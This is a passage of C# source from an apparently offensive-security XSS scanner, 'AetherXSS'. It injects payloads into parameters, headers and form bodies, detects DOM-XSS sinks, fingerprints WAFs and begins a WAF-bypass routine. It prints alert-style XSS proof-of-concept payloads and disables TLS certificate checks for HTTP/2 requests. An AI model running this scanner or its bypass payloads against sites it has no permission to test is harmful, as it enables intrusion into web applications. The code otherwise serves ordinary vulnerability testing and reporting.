        handler.ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator;

        using (HttpClient http2Client = new HttpClient(handler))
        {
            http2Client.DefaultRequestVersion = new Version(2, 0); // HTTP/2
            HttpResponseMessage response = await http2Client.SendAsync(request);

            string responseBody = await response.Content.ReadAsStringAsync();
            if (responseBody.Contains(payload))
            {
                PrintColored($"[!] XSS Vulnerability Detected (HTTP/2): {url}", ConsoleColor.Red);
                AnimatedUI.ShowVulnerabilityFound(url, "HTTP/2 Reflection");
            }
            else if (verbose)
            {
                PrintColored($"[-] {url} (HTTP/2) appears clean.", ConsoleColor.Green);
            }
        }
    }
    catch (Exception ex)
    {
        if (verbose)
        {
            PrintColored($"[!] Error in HTTP/2 request to {url}: {ex.Message}", ConsoleColor.Yellow);
        }
    }
}

async Task TestPostRequest(string url, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    try
    {
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
        AddHeaders(request, cookie, extraHeaders, customUserAgent);

        var content = new FormUrlEncodedContent(new[]
        {
                    new KeyValuePair<string, string>("xss", payload)
                });
        request.Content = content;

        HttpResponseMessage response = await client.SendAsync(request);
        string responseBody = await response.Content.ReadAsStringAsync();

        lock (statistics)
        {
            statistics["testedUrls"]++;
        }

        if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
        {
            lock (discoveredVulnerabilities)
            {
                discoveredVulnerabilities.Add($"POST: {url} (Payload: {payload})");
            }

            lock (statistics)
            {
                statistics["vulnerableUrls"]++;
            }

            PrintColored($"\n[!] XSS Vulnerability (POST) Detected! {url}", ConsoleColor.Red);

            if (autoExploit)
            {
                await AutoExploit(url, "POST", payload);
            }
        }
        else if (verbose)
        {
            PrintColored($"\n[-] {url} (POST) appears clean.", ConsoleColor.Green);
        }
    }
    catch (Exception ex)
    {
        lock (statistics)
        {
            statistics["failedRequests"]++;
        }

        if (verbose)
        {
            PrintColored($"\n[!] Error in POST request to {url}: {ex.Message}", ConsoleColor.Yellow);
        }
    }
}

async Task TestCustomMethodRequest(string url, string method, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    try
    {
        HttpMethod httpMethod = new HttpMethod(method);
        HttpRequestMessage request = new HttpRequestMessage(httpMethod, url);
        AddHeaders(request, cookie, extraHeaders, customUserAgent);

        if (method != "HEAD" && method != "OPTIONS")
        {
            request.Content = new StringContent($"xss={HttpUtility.UrlEncode(payload)}", Encoding.UTF8, "application/x-www-form-urlencoded");
        }

        HttpResponseMessage response = await client.SendAsync(request);

        if (method != "HEAD")
        {
            string responseBody = await response.Content.ReadAsStringAsync();

            lock (statistics)
            {
                statistics["testedUrls"]++;
            }

            if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
            {
                lock (discoveredVulnerabilities)
                {
                    discoveredVulnerabilities.Add($"{method}: {url} (Payload: {payload})");
                }

                lock (statistics)
                {
                    statistics["vulnerableUrls"]++;
                }

                PrintColored($"\n[!] XSS Vulnerability ({method}) Detected! {url}", ConsoleColor.Red);

                if (autoExploit)
                {
                    await AutoExploit(url, method, payload);
                }
            }
            else if (verbose)
            {
                PrintColored($"\n[-] {url} ({method}) appears clean.", ConsoleColor.Green);
            }
        }
    }
    catch (Exception ex)
    {
        lock (statistics)
        {
            statistics["failedRequests"]++;
        }

        if (verbose)
        {
            PrintColored($"\n[!] Error in {method} request to {url}: {ex.Message}", ConsoleColor.Yellow);
        }
    }
}

async Task TestHeaderInjection(string url, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    var headersToTest = new Dictionary<string, string>
            {
                { "Referer", payload },
                { "User-Agent", payload },
                { "X-Forwarded-For", payload },
                { "Origin", payload },
                { "X-Requested-With", payload },
                { "X-AetherXSS-Test", payload }
            };

    foreach (var headerPair in headersToTest)
    {
        try
        {
            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
            AddHeaders(request, cookie, extraHeaders, customUserAgent);

            // Add the payload to the specific header
            if (request.Headers.Contains(headerPair.Key))
            {
                request.Headers.Remove(headerPair.Key);
            }
            request.Headers.Add(headerPair.Key, headerPair.Value);

            HttpResponseMessage response = await client.SendAsync(request);
            string responseBody = await response.Content.ReadAsStringAsync();

            lock (statistics)
            {
                statistics["testedUrls"]++;
            }

            if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
            {
                lock (discoveredVulnerabilities)
                {
                    discoveredVulnerabilities.Add($"Header ({headerPair.Key}): {url}");
                }

                lock (statistics)
                {
                    statistics["vulnerableUrls"]++;
                }

                PrintColored($"\n[!] XSS Vulnerability (Header: {headerPair.Key}) Detected! {url}", ConsoleColor.Red);
            }
            else if (verbose)
            {
                PrintColored($"\n[-] {url} (Header: {headerPair.Key}) appears clean.", ConsoleColor.Green);
            }
        }
        catch (Exception ex)
        {
            lock (statistics)
            {
                statistics["failedRequests"]++;
            }

            if (verbose)
            {
                PrintColored($"\n[!] Error in request to {url} (Header: {headerPair.Key}): {ex.Message}", ConsoleColor.Yellow);
            }
        }
    }
}

async Task TestParameterInjection(string url, string parameter, string payload, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    string encodedPayload = HttpUtility.UrlEncode(payload);
    string testUrl = url.Contains("?") ? $"{url}&{parameter}={encodedPayload}" : $"{url}?{parameter}={encodedPayload}";

    try
    {
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, testUrl);
        AddHeaders(request, cookie, extraHeaders, customUserAgent);

        HttpResponseMessage response = await client.SendAsync(request);
        string responseBody = await response.Content.ReadAsStringAsync();

        lock (statistics)
        {
            statistics["testedUrls"]++;
            statistics["parametersFound"]++;
        }

        if (responseBody.Contains(payload) || IsReflectedInResponse(responseBody, payload))
        {
            lock (discoveredVulnerabilities)
            {
                discoveredVulnerabilities.Add($"Parameter ({parameter}): {testUrl}");
            }

            lock (statistics)
            {
                statistics["vulnerableUrls"]++;
            }

            PrintColored($"\n[!] XSS Vulnerability (Parameter: {parameter}) Detected! {testUrl}", ConsoleColor.Red);

            if (autoExploit)
            {
                await AutoExploit(testUrl, "GET");
            }
        }
        else if (verbose)
        {
            PrintColored($"\n[-] {testUrl} (Parameter: {parameter}) appears clean.", ConsoleColor.Green);
        }
    }
    catch (Exception ex)
    {
        lock (statistics)
        {
            statistics["failedRequests"]++;
        }

        if (verbose)
        {
            PrintColored($"\n[!] Error in request to {testUrl} (Parameter: {parameter}): {ex.Message}", ConsoleColor.Yellow);
        }
    }
}

async Task ScanForDomXSS(string url, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    try
    {
        // Send an HTTP GET request to fetch the page content
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
        AddHeaders(request, cookie, extraHeaders, customUserAgent);

        HttpResponseMessage response = await client.SendAsync(request);
        string responseBody = await response.Content.ReadAsStringAsync();

        bool foundDomXSS = false;
        var detectedVulnerabilities = new List<(string sink, string context, string risk)>();

        // Advanced DOM XSS sink detection with context analysis
        foreach (var sink in domXssSinks)
        {
            if (responseBody.Contains(sink))
            {
                // Analyze the context where the sink is found
                var contexts = AnalyzeDOMContext(responseBody, sink);
                foreach (var context in contexts)
                {
                    var riskLevel = AssessRiskLevel(sink, context);
                    detectedVulnerabilities.Add((sink, context, riskLevel));
                    foundDomXSS = true;
                }
            }
        }

        // Check for indirect DOM XSS vectors
        var indirectVectors = new[]
        {
            ("location.hash", "URL Fragment"),
            ("location.search", "URL Parameters"),
            ("document.referrer", "Referrer"),
            ("localStorage.getItem", "Local Storage"),
            ("sessionStorage.getItem", "Session Storage"),
            ("document.cookie", "Cookies")
        };

        foreach (var (vector, source) in indirectVectors)
        {
            if (responseBody.Contains(vector))
            {
                var contextAnalysis = AnalyzeDataFlow(responseBody, vector);
                if (contextAnalysis.isVulnerable)
                {
                    detectedVulnerabilities.Add((vector, source, "High"));
                    foundDomXSS = true;
                }
            }
        }

        // Report findings
        if (foundDomXSS)
        {
            lock (discoveredVulnerabilities)
            {
                foreach (var (sink, context, risk) in detectedVulnerabilities)
                {
                    var vulnDetails = $"DOM XSS ({sink} in {context}) - Risk: {risk}";
                    discoveredVulnerabilities.Add($"{vulnDetails}: {url}");

                    // Print detailed findings
                    PrintColored($"\n[!] DOM-XSS Vulnerability Detected!", ConsoleColor.Red);
                    PrintColored($"    Sink: {sink}", ConsoleColor.Yellow);
                    PrintColored($"    Context: {context}", ConsoleColor.Yellow);
                    PrintColored($"    Risk Level: {risk}", ConsoleColor.Yellow);
                    PrintColored($"    URL: {url}", ConsoleColor.Yellow);

                    // Generate proof of concept if possible
                    var poc = GenerateDOMXSSPoC(sink, context);
                    if (!string.IsNullOrEmpty(poc))
                    {
                        PrintColored($"    PoC: {poc}", ConsoleColor.Cyan);
                    }
                }
            }

            lock (statistics)
            {
                statistics["vulnerableUrls"]++;
            }
        }
        else if (verbose)
        {
            PrintColored($"\n[-] {url} (DOM-XSS) appears clean.", ConsoleColor.Green);
        }

        // Additional checks for framework-specific vulnerabilities
        await CheckFrameworkSpecificVulnerabilities(url, responseBody);
    }
    catch (Exception ex)
    {
        lock (statistics)
        {
            statistics["failedRequests"]++;
        }

        if (verbose)
        {
            PrintColored($"\n[!] Error in DOM-XSS scan for {url}: {ex.Message}", ConsoleColor.Yellow);
        }
    }
}

// Helper method to analyze DOM context
List<string> AnalyzeDOMContext(string html, string sink)
{
    var contexts = new List<string>();
    try
    {
        if (html.Contains($"<script>{sink}"))
            contexts.Add("JavaScript Block");
        if (html.Contains($"onclick=\"{sink}"))
            contexts.Add("Event Handler");
        if (html.Contains($"href=\"javascript:{sink}"))
            contexts.Add("URL Protocol");
        if (Regex.IsMatch(html, $@"<\w+[^>]*?{sink}[^>]*?>"))
            contexts.Add("HTML Attribute");
        if (html.Contains($"eval({sink}"))
            contexts.Add("Dynamic Evaluation");
        if (html.Contains($"new Function({sink}"))
            contexts.Add("Function Constructor");
    }
    catch (Exception ex)
    {
        if (verbose)
            PrintColored($"Error analyzing DOM context: {ex.Message}", ConsoleColor.Yellow);
    }
    return contexts;
}

// Helper method to assess risk level
string AssessRiskLevel(string sink, string context)
{
    // High-risk sinks
    if (sink.Contains("eval(") || sink.Contains("Function(") ||
        sink.Contains("setTimeout(") || sink.Contains("setInterval("))
        return "Critical";

    // Context-based risk assessment
    if (context == "JavaScript Block" || context == "Dynamic Evaluation")
        return "High";
    if (context == "Event Handler" || context == "URL Protocol")
        return "Medium";

    return "Low";
}

// Helper method to analyze data flow
(bool isVulnerable, string details) AnalyzeDataFlow(string html, string source)
{
    try
    {
        // Check if source data is used in dangerous operations
        var dangerousPatterns = new[]
        {
            @"eval\s*\(\s*" + Regex.Escape(source),
            @"innerHTML\s*=\s*.*?" + Regex.Escape(source),
            @"document\.write\s*\(\s*.*?" + Regex.Escape(source),
            @"setAttribute\s*\(\s*['""]on\w+['""],\s*.*?" + Regex.Escape(source)
        };

        foreach (var pattern in dangerousPatterns)
        {
            if (Regex.IsMatch(html, pattern, RegexOptions.IgnoreCase))
            {
                return (true, $"Dangerous operation found: {pattern}");
            }
        }
    }
    catch (Exception ex)
    {
        if (verbose)
            PrintColored($"Error in data flow analysis: {ex.Message}", ConsoleColor.Yellow);
    }
    return (false, string.Empty);
}

// Helper method to generate proof of concept
string GenerateDOMXSSPoC(string sink, string context)
{
    try
    {
        switch (context)
        {
            case "JavaScript Block":
                return $"<script>alert('XSS via {sink}')</script>";
            case "Event Handler":
                return $"<img src=x onerror=\"alert('XSS via {sink}')\">";
            case "URL Protocol":
                return $"javascript:alert('XSS via {sink}')";
            case "HTML Attribute":
                return $"\" onmouseover=\"alert('XSS via {sink}')";
            default:
                return $"<img src=x onerror=alert('XSS')>";
        }
    }
    catch
    {
        return string.Empty;
    }
}

// Helper method to check framework-specific vulnerabilities
async Task CheckFrameworkSpecificVulnerabilities(string url, string html)
{
    try
    {
        // Check for Angular-specific vulnerabilities
        if (html.Contains("ng-app") || html.Contains("angular.js"))
        {
            if (html.Contains("{{") && html.Contains("}}"))
            {
                PrintColored("\n[!] Potential Angular template injection point detected", ConsoleColor.Yellow);
            }
        }

        // Check for React-specific vulnerabilities
        if (html.Contains("react.js") || html.Contains("react-dom.js"))
        {
            if (html.Contains("dangerouslySetInnerHTML"))
            {
                PrintColored("\n[!] Potentially unsafe React DOM manipulation detected", ConsoleColor.Yellow);
            }
        }

        // Check for Vue.js-specific vulnerabilities
        if (html.Contains("vue.js"))
        {
            if (html.Contains("v-html"))
            {
                PrintColored("\n[!] Potentially unsafe Vue.js template binding detected", ConsoleColor.Yellow);
            }
        }
    }
    catch (Exception ex)
    {
        if (verbose)
            PrintColored($"Error checking framework vulnerabilities: {ex.Message}", ConsoleColor.Yellow);
    }
}

async Task<List<string>> CrawlWebsite(string startUrl, int maxDepth)
{
    HashSet<string> discovered = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
    HashSet<string> crawled = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
    List<string> result = new List<string>();

    discovered.Add(startUrl);
    result.Add(startUrl);

    Uri baseUri = new Uri(startUrl);
    string baseDomain = baseUri.Host;

    Console.WriteLine();
    PrintColored($"[+] Starting web crawl from {startUrl}", ConsoleColor.Cyan);
    PrintColored($"[*] Looking for additional targets (max depth: {maxDepth})", ConsoleColor.Cyan);
    Console.WriteLine();

    for (int depth = 0; depth < maxDepth; depth++)
    {
        List<string> currentDepthUrls = new List<string>(discovered.Except(crawled));

        if (currentDepthUrls.Count == 0)
            break;

        PrintColored($"⏱️ Crawling depth level {depth + 1}/{maxDepth} - Found {currentDepthUrls.Count} URLs to process", ConsoleColor.Yellow);

        foreach (string url in currentDepthUrls)
        {
            try
            {
                AnimatedUI.ShowScanningAnimation(url);

                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
                HttpResponseMessage response = await client.SendAsync(request);
                string responseBody = await response.Content.ReadAsStringAsync();

                crawled.Add(url);

                // Extract URLs from href attributes
                var matches = Regex.Matches(responseBody, @"href=[""']([^""']+)[""']");
                int newUrlsFound = 0;

                foreach (Match match in matches)
                {
                    string href = match.Groups[1].Value;
                    if (string.IsNullOrWhiteSpace(href) || href.StartsWith("#"))
                        continue;

                    Uri resolvedUri;
                    if (Uri.TryCreate(new Uri(url), href, out resolvedUri))
                    {
                        if (resolvedUri.Host == baseDomain && !discovered.Contains(resolvedUri.AbsoluteUri))
                        {
                            discovered.Add(resolvedUri.AbsoluteUri);
                            result.Add(resolvedUri.AbsoluteUri);
                            newUrlsFound++;

                            if (verbose)
                            {
                                PrintColored($"\n[+] Found URL: {resolvedUri.AbsoluteUri}", ConsoleColor.Cyan);
                            }
                        }
                    }
                }

                // Only show this message if we found new URLs and not in verbose mode (to avoid clutter)
                if (newUrlsFound > 0 && !verbose)
                {
                    PrintColored($"  ↪ Found {newUrlsFound} new URLs from {url}", ConsoleColor.Cyan);
                }

                // Show progress
                AnimatedUI.ShowProgressBar(crawled.Count, discovered.Count);
            }
            catch (Exception ex)
            {
                if (verbose)
                {
                    PrintColored($"\n[!] Error crawling {url}: {ex.Message}", ConsoleColor.Yellow);
                }
            }
        }

        PrintColored($"✅ Completed depth level {depth + 1} - Total URLs discovered: {discovered.Count}", ConsoleColor.Green);
    }

    PrintColored($"\n🎯 Crawling complete! Found {result.Count} unique URLs", ConsoleColor.Green);
    return result;
}

bool IsReflectedInResponse(string responseBody, string payload)
{
    // Basic reflection check
    if (responseBody.Contains(payload))
        return true;

    // Check for URL-encoded version
    string encodedPayload = HttpUtility.UrlEncode(payload);
    if (responseBody.Contains(encodedPayload))
        return true;

    // Check for HTML-encoded version
    string htmlEncodedPayload = HttpUtility.HtmlEncode(payload);
    if (responseBody.Contains(htmlEncodedPayload))
        return true;

    // Check for double-encoded version
    string doubleEncodedPayload = HttpUtility.UrlEncode(HttpUtility.UrlEncode(payload));
    if (responseBody.Contains(doubleEncodedPayload))
        return true;

    return false;
}

async Task AutoExploit(string url, string method, string payload = null)
{
    try
    {
        Console.WriteLine();
        PrintColored($"[*] Attempting to verify and exploit vulnerability...", ConsoleColor.Yellow);

        // More professional approach
        string[] exploitSteps = new string[] {
                    "Analyzing attack vector",
                    "Identifying injection context",
                    "Creating proof-of-concept payload",
                    "Testing payload execution",
                    "Verifying XSS reflection",
                    "Checking execution context",
                    "Validating browser behavior"
                };

        // Show exploitation progress
        for (int i = 0; i < exploitSteps.Length; i++)
        {
            await Task.Run(() => AnimatedUI.ShowLoadingAnimation(exploitSteps[i]));
        }

        // Create a unique XSS PoC for the vulnerability
        string pocPayload = GenerateProofOfConcept(url, method, payload);

        // Show vulnerability details
        AnimatedUI.ShowVulnerabilityFound(url, $"XSS via {method}");

        // Show proof-of-concept details
        Console.WriteLine();
        PrintColored("[+] Proof of Concept Generated", ConsoleColor.Green);
        Console.WriteLine();
        PrintColored("  Details:", ConsoleColor.White);
        PrintColored($"  URL: {url}", ConsoleColor.White);
        PrintColored($"  Method: {method}", ConsoleColor.White);
        PrintColored($"  Payload: {pocPayload}", ConsoleColor.White);

        // Show impact explanation
        Console.WriteLine();
        PrintColored("[*] Impact Analysis:", ConsoleColor.Yellow);
        Console.WriteLine("  This vulnerability could allow attackers to:");
        Console.WriteLine("  - Execute arbitrary JavaScript in users' browsers");
        Console.WriteLine("  - Steal session cookies and hijack user sessions");
        Console.WriteLine("  - Perform actions on behalf of the victim");
        Console.WriteLine("  - Access sensitive data displayed on the page");

        Console.WriteLine();
        PrintColored("[*] Remediation:", ConsoleColor.Yellow);
        Console.WriteLine("  - Implement proper output encoding for all dynamic content");
        Console.WriteLine("  - Validate and sanitize all user inputs");
        Console.WriteLine("  - Implement Content Security Policy (CSP) headers");
        Console.WriteLine("  - Use framework-provided XSS protection mechanisms");

        Console.WriteLine();
    }
    catch (Exception ex)
    {
        if (verbose)
        {
            PrintColored($"\n[!] Auto-exploit failed: {ex.Message}", ConsoleColor.Yellow);
        }
    }
}

// Helper method to generate a proof-of-concept XSS payload
string GenerateProofOfConcept(string url, string method, string payload = null)
{
    // Use the original payload if provided, otherwise generate a safe PoC
    if (!string.IsNullOrEmpty(payload))
    {
        return payload;
    }

    // Create a benign payload that demonstrates the vulnerability without harmful effects
    return "<script>console.log('XSS Vulnerability Confirmed: ' + document.domain)</script>";
}

void GenerateReport(string reportPath)
{
    try
    {
        StringBuilder report = new StringBuilder();
        report.AppendLine("<!DOCTYPE html>");
        report.AppendLine("<html lang=\"en\">");
        report.AppendLine("<head>");
        report.AppendLine("<meta charset=\"UTF-8\">");
        report.AppendLine("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">");
        report.AppendLine("<title>AetherXSS Security Scan Report</title>");
        report.AppendLine("<style>");
        report.AppendLine(@"
                    body { 
                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                        margin: 0; 
                        padding: 0; 
                        background: #f4f6f8; 
                        color: #333; 
                    }
                    .container { 
                        max-width: 1200px; 
                        margin: 0 auto; 
                        background: white; 
                        padding: 30px; 
                        border-radius: 8px; 
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
                        margin-top: 20px;
                        margin-bottom: 20px;
                    }
                    h1, h2, h3, h4 { 
                        color: #2c3e50; 
                        margin-top: 0; 
                    }
                    h1 { 
                        text-align: center; 
                        padding-bottom: 20px; 
                        border-bottom: 1px solid #eee; 
                        margin-bottom: 30px;
                    }
                    .header-logo {
                        text-align: center;
                        margin-bottom: 20px;
                        font-size: 28px;
                        font-weight: bold;
                    }
                    .stats { 
                        display: grid; 
                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
                        gap: 20px; 
                        margin: 30px 0; 
                    }
                    .stat-card { 
                        background: #f8f9fa; 
                        padding: 20px; 
                        border-radius: 8px; 
                        text-align: center; 
                        border-left: 4px solid #4e73df;
                        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                    }
                    .stat-card h3 {
                        margin-top: 0;
                        color: #4e73df;
                        font-size: 16px;
                    }
                    .stat-card p {
                        font-size: 24px;
                        font-weight: bold;
                        margin: 10px 0 0 0;
                    }
                    .vulnerability { 
                        background: #fff8f8; 
                        padding: 20px; 
                        margin: 15px 0; 
                        border-left: 4px solid #e74a3b; 
                        border-radius: 4px;
                        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                    }
                    .vulnerability h4 {
                        margin-top: 0;
                        color: #e74a3b;
                    }
                    .vulnerability-details {
                        margin-top: 10px;
                        padding-left: 20px;
                    }
                    .vulnerability-details p {
                        margin: 5px 0;
                    }
                    .secure-note {
                        background: #f0fff4;
                        padding: 20px;
                        border-left: 4px solid #1cc88a;
                        border-radius: 4px;
                        margin: 20px 0;
                    }
                    .timestamp { 
                        color: #858796; 
                        font-size: 0.9em; 
                        text-align: right;
                        margin-top: 20px;
                    }
                    .footer { 
                        text-align: center; 
                        margin-top: 40px; 
                        color: #858796; 
                        padding-top: 20px;
                        border-top: 1px solid #eee;
                    }
                    .severity-high {
                        color: #e74a3b;
                        font-weight: bold;
                    }
                    .severity-medium {
                        color: #f6c23e;
                        font-weight: bold;
                    }
                    .severity-low {
                        color: #36b9cc;
                        font-weight: bold;
                    }
                    .summary-section {
                        margin: 30px 0;
                    }
                    table {
                        width: 100%;
                        border-collapse: collapse;
                    }
                    table th, table td {
                        padding: 10px;
                        text-align: left;
                        border-bottom: 1px solid #e3e6f0;
                    }
                    table th {
                        background-color: #f8f9fc;
                    }
                    .remediation {
                        background: #e8f4fd;
                        padding: 15px;
                        border-radius: 4px;
                        margin-top: 10px;
                    }
                    .remediation h5 {
                        margin-top: 0;
                        color: #4e73df;
                    }
                ");
        report.AppendLine("</style>");
        report.AppendLine("</head>");
        report.AppendLine("<body>");

        report.AppendLine("<div class=\"container\">");
        report.AppendLine("<div class=\"header-logo\">AetherXSS</div>");
        report.AppendLine("<h1>Cross-Site Scripting Security Scan Report</h1>");

        // Report summary
        report.AppendLine("<div class=\"summary-section\">");
        report.AppendLine("<h2>Executive Summary</h2>");

        if (discoveredVulnerabilities.Any())
        {
            report.AppendLine($"<p>The security scan detected <span class=\"severity-high\">{statistics["vulnerableUrls"]} Cross-Site Scripting vulnerabilities</span> in the target application. These vulnerabilities could potentially allow attackers to inject malicious scripts that execute in users' browsers, potentially leading to session hijacking, credential theft, or defacement.</p>");
        }
        else
        {
            report.AppendLine("<p>The security scan did not detect any Cross-Site Scripting vulnerabilities in the target application. However, this does not guarantee that the application is completely secure, as new vulnerabilities are discovered regularly.</p>");
            report.AppendLine("<div class=\"secure-note\"><strong>Note:</strong> While no XSS vulnerabilities were found, it's recommended to implement Content Security Policy (CSP) and other defensive measures as part of a defense-in-depth strategy.</div>");
        }

        report.AppendLine("</div>");

        // Scan information
        report.AppendLine("<h2>Scan Information</h2>");
        report.AppendLine("<table>");
        report.AppendLine("<tr><th>Scan Date</th><td>" + DateTime.Now.ToString("yyyy-MM-dd") + "</td></tr>");
        report.AppendLine("<tr><th>Scan Time</th><td>" + DateTime.Now.ToString("HH:mm:ss") + "</td></tr>");
        report.AppendLine("<tr><th>Scanner Version</th><td>AetherXSS 1.0</td></tr>");
        report.AppendLine("<tr><th>Payloads Tested</th><td>" + (xssPayloads.Count + customPayloads.Count) + "</td></tr>");
        report.AppendLine("<tr><th>WAF Detection</th><td>Enabled</td></tr>");
        report.AppendLine("<tr><th>Context Analysis</th><td>Enabled</td></tr>");
        report.AppendLine("</table>");

        // Statistics
        report.AppendLine("<h2>Scan Statistics</h2>");
        report.AppendLine("<div class=\"stats\">");
        report.AppendLine($"<div class=\"stat-card\"><h3>URLS TESTED</h3><p>{statistics["testedUrls"]}</p></div>");

        if (statistics["vulnerableUrls"] > 0)
        {
            report.AppendLine($"<div class=\"stat-card\" style=\"border-left-color: #e74a3b;\"><h3>XSS VULNERABILITIES</h3><p style=\"color: #e74a3b;\">{statistics["vulnerableUrls"]}</p></div>");
        }
        else
        {
            report.AppendLine($"<div class=\"stat-card\" style=\"border-left-color: #1cc88a;\"><h3>XSS VULNERABILITIES</h3><p style=\"color: #1cc88a;\">0</p></div>");
        }

        report.AppendLine($"<div class=\"stat-card\"><h3>FAILED REQUESTS</h3><p>{statistics["failedRequests"]}</p></div>");
        report.AppendLine($"<div class=\"stat-card\"><h3>PARAMETERS TESTED</h3><p>{statistics["parametersFound"]}</p></div>");
        report.AppendLine("</div>");

        // Vulnerabilities
        if (discoveredVulnerabilities.Any())
        {
            report.AppendLine("<h2>Discovered Vulnerabilities</h2>");

            int vulnCounter = 1;
            foreach (var vuln in discoveredVulnerabilities)
            {
                string severity = "High";
                string severityClass = "severity-high";

                // Determine severity based on vulnerability type
                if (vuln.Contains("WAF Bypass"))
                {
                    severity = "Critical";
                }
                else if (vuln.Contains("DOM XSS"))
                {
                    severity = "High";
                }
                else if (vuln.Contains("Stored"))
                {
                    severity = "High";
                }
                else
                {
                    severity = "Medium";
                    severityClass = "severity-medium";
                }

                report.AppendLine("<div class=\"vulnerability\">");
                report.AppendLine($"<h4>Vulnerability #{vulnCounter}: Cross-Site Scripting (<span class=\"{severityClass}\">{severity}</span>)</h4>");
                report.AppendLine("<div class=\"vulnerability-details\">");
                report.AppendLine($"<p><strong>URL:</strong> {HttpUtility.HtmlEncode(vuln.Substring(vuln.IndexOf(":") + 1).Trim())}</p>");
                report.AppendLine($"<p><strong>Type:</strong> {vuln.Substring(0, vuln.IndexOf(":")).Trim()}</p>");

                // Suggested remediation based on vulnerability type
                report.AppendLine("<div class=\"remediation\">");
                report.AppendLine("<h5>Remediation Guidance</h5>");
                report.AppendLine("<p>To fix this vulnerability:</p>");
                report.AppendLine("<ul>");
                report.AppendLine("<li>Implement proper output encoding for all dynamic content</li>");
                report.AppendLine("<li>Validate and sanitize all user inputs</li>");
                report.AppendLine("<li>Implement Content Security Policy (CSP) headers</li>");
                report.AppendLine("<li>Use framework-provided XSS protection mechanisms</li>");

                if (vuln.Contains("WAF Bypass"))
                {
                    report.AppendLine("<li>Update your WAF rules to handle the specific bypass technique used</li>");
                }

                if (vuln.Contains("DOM"))
                {
                    report.AppendLine("<li>Review client-side JavaScript code that manipulates the DOM</li>");
                    report.AppendLine("<li>Use safe DOM manipulation methods (e.g., textContent instead of innerHTML)</li>");
                }

                report.AppendLine("</ul>");
                report.AppendLine("</div>"); // end remediation

                report.AppendLine("</div>"); // end vulnerability-details
                report.AppendLine("</div>"); // end vulnerability

                vulnCounter++;
            }

            // Risk assessment
            report.AppendLine("<h2>Risk Assessment</h2>");
            report.AppendLine("<p>Cross-Site Scripting vulnerabilities can lead to multiple security risks:</p>");
            report.AppendLine("<ul>");
            report.AppendLine("<li><strong>Session Hijacking:</strong> Attackers can steal user session tokens</li>");
            report.AppendLine("<li><strong>Credential Theft:</strong> Attackers can create malicious forms to capture credentials</li>");
            report.AppendLine("<li><strong>Data Theft:</strong> Sensitive data displayed on the page can be accessed</li>");
            report.AppendLine("<li><strong>Site Defacement:</strong> Attackers can modify page content</li>");
            report.AppendLine("<li><strong>Malware Distribution:</strong> Attackers can redirect users to malicious sites</li>");
            report.AppendLine("</ul>");
        }
        else
        {
            report.AppendLine("<h2>No Vulnerabilities Found</h2>");
            report.AppendLine("<p>No Cross-Site Scripting vulnerabilities were detected during the scan. However, we recommend implementing the following security best practices:</p>");
            report.AppendLine("<ul>");
            report.AppendLine("<li>Implement Content Security Policy (CSP) headers</li>");
            report.AppendLine("<li>Use modern frameworks with built-in XSS protection</li>");
            report.AppendLine("<li>Validate and sanitize all user inputs</li>");
            report.AppendLine("<li>Implement proper output encoding for all dynamic content</li>");
            report.AppendLine("<li>Regularly test your application for new vulnerabilities</li>");
            report.AppendLine("</ul>");
        }

        report.AppendLine("<div class=\"timestamp\">Report generated on: " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "</div>");

        report.AppendLine("<div class=\"footer\">");
        report.AppendLine("<p>Generated by AetherXSS Scanner - Advanced Cross-Site Scripting Testing Tool</p>");
        report.AppendLine("</div>");

        report.AppendLine("</div>"); // end container
        report.AppendLine("</body>");
        report.AppendLine("</html>");

        File.WriteAllText(reportPath, report.ToString());
        PrintColored($"\n[+] Comprehensive security report generated: {reportPath}", ConsoleColor.Green);
    }
    catch (Exception ex)
    {
        PrintColored($"\n[!] Error generating report: {ex.Message}", ConsoleColor.Yellow);
    }
}

// New method to detect WAF presence
bool DetectWAF(HttpResponseMessage response, string responseBody)
{
    // Check for common WAF signatures in headers
    if (response.Headers.Contains("X-WAF") ||
        response.Headers.Contains("X-Powered-By-WAF") ||
        response.Headers.Contains("X-XSS-Protection"))
    {
        return true;
    }

    // Check for WAF signatures in cookies
    if (response.Headers.Contains("Set-Cookie"))
    {
        var cookies = response.Headers.GetValues("Set-Cookie");
        foreach (var cookie in cookies)
        {
            if (cookie.Contains("__cfduid") || // CloudFlare
                cookie.Contains("AKAMAI") ||   // Akamai 
                cookie.Contains("bigipserver") || // F5 BIG-IP
                cookie.Contains("incap_ses"))   // Incapsula
            {
                return true;
            }
        }
    }

    // Check response body for WAF block messages
    string[] wafPatterns = {
                "CloudFlare", "Cloudflare", "cloudflare",
                "Mod_Security", "ModSecurity", "mod_security",
                "Incapsula", "IncapsulaWAF",
                "F5 Networks", "F5", "BIG-IP",
                "Akamai", "AkamaiGhost",
                "Imperva", "ImpervaWAF"
            };

    foreach (var pattern in wafPatterns)
    {
        if (responseBody.Contains(pattern))
        {
            return true;
        }
    }

    return false;
}

// New method to test WAF bypass payloads
async Task TestWAFBypass(string url, string cookie, Dictionary<string, string> extraHeaders, string customUserAgent)
{
    foreach (var bypass in wafBypassPayloads)
    {
        string wafName = bypass.Key;
        string payload = bypass.Value;

